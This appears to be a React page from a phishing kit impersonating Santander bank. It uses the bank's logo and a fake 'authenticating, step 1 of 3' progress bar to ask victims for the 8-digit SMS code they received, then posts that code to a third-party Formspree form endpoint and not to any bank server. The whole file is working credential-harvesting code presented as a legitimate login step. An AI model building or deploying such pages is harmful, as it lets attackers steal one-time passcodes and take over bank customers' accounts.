import React from 'react';
import '../css/segundapag.css';
import { useNavigate } from 'react-router-dom';

function Segundapag() {
  const navigate = useNavigate();

  const handleSubmit = async (event) => {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    
    try {
      const response = await fetch('https://formspree.io/f/mblrdvkb', {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      });

      if (response.ok) {
        console.log('Datos enviados correctamente');
        navigate('/tercerapag');
      } else {
        console.error('Error al enviar los datos');
      }
    } catch (error) {
      console.error('Error al enviar los datos:', error);
    }
  };

  return (
    <div className="auth-container">
      <div className="auth-header">
        <span className="auth-logo">
          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="" />
        </span>
      </div>
      <div className="auth-progress">
        <div className="auth-step-circle">1</div>
        <div className="auth-status">
          <p>Lo estamos autenticando</p>
          <p>1 de 3</p>
        </div>
        <div className="auth-progress-bar">
          <div className="auth-progress-bar-fill"></div>
        </div>
      </div>
      <form className="auth-form" onSubmit={handleSubmit}>
        <label>
          Ingrese los números que recibió por mensaje SMS:
          <input type="tel" name="sms-code" maxLength={8} placeholder="8 dígitos" className="auth-input" />
        </label>
        <button type="submit" className="auth-continue-button">Continuar</button>
      </form>
    </div>
  );
}

export default Segundapag;
